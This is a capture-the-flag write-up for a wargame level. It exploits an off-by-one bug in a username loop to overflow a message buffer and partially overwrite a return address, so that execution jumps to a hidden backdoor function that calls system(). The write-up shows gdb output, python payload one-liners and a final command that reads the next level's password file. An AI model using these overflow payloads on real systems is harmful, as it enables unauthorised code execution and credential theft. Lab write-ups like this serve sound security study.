# Level 09

## the goal

We have an executable asking for a name and a message who will be sent we don't know where (to hell???).

```sh
$ ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: 42
>: Welcome, 42
>: Msg @Unix-Dude
>>: reef > free
>: Msg sent!
```

By reading the source code, we can see a very useful function: secret_backdoor() which calls the system function by passing it the standart input as an argument.

```c
int secret_backdoor()
{
  char s[128];

  fgets(s, 128, stdin);
  return system(s);
}

```

The secret_backdoor address can be find as follow:

```sh
(gdb) r <<< $(python -c 'print("A" * 40 + "\xca")')
Starting program: /home/users/level09/level09 <<< $(python -c 'print("A" * 40 + "\xca" * 146)')
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Program received signal SIGSEGV, Segmentation fault.
0x0000555555550000 in ?? ()
(gdb) disass secret_backdoor
Dump of assembler code for function secret_backdoor:
	0x000055555555488c <+0>:	push   %rbp
	...
```

The address of our function is 0x000055555555488c.
We also see that the program crashes at the address 0x0000555555550000.
There's only a 2-byte difference between the two, so we can replace just that!

Now, we have to have to find a way to call this function.

Looking a little deeper into the source code, we see that the message and its length are located in a structure.

If we want to create an overflow, the length of the message must exceed the length of the array (140 char). Hopefully, there's a way to overflow memory in the set_username() function.
A loop at the end of the function is suppoded to store the first 40 characters retrieved by fgets() in the "name" part of the structure, which is an array of 40 char. But, what a pity, the condition is badly done! It says "i <= 40" instead of "i < 40", so the function will store one extra byte in the structure, overridding one byte of the length parameter.

We can then provoke our first segfault, and use this to inject the call to our backdoor:

```sh
$ (python -c 'print("A" * 40 + "\xca")') | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
Segmentation fault (core dumped)
```

### the hack

```sh
$ (python -c 'print("A" * 40 + "\xca" + "\x8c\x48" * 146)'; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
cat /home/users/end/.pass
```
